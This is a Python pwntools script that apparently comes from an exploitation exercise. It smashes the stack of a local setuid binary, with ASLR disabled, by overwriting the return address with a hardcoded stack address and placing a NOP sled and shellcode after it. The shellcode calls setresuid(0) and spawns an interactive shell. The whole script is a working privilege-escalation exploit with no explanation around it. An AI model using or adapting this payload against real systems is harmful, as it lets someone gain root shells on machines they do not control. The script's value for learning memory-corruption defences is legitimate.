#!/usr/bin/env python3

import sys
from pwn import asm, context, log, p64, process, shellcraft


with open("/proc/sys/kernel/randomize_va_space", "r") as f:
    if f.readline().strip() != "0":
        log.error("Make sure ASLR is disabled!")


context.update(arch="amd64", os="linux")

process = process("../binaries/simple-bo-exec-setuid")

text = process.recvline_containsS("What is your name?", timeout=3)

# Address of str on the stack
str_address = 0x7FFFFFFFE200

# Stack smashing (str len + caller function's rbp, i.e., 8 bytes)
payload = b"A" * 0x10 + b"YADAYADA"

# + 8 bytes, because shellcode is right after ret_address in the stack
ret_address = str_address + len(payload) + 8
payload += (
    p64(ret_address)
    + b"\x90" * 30
    + asm(shellcraft.setresuid(0))
    + asm(shellcraft.sh())
)

log.info(f"Payload: {payload}")

process.clean()
process.sendline(payload)
process.interactive()
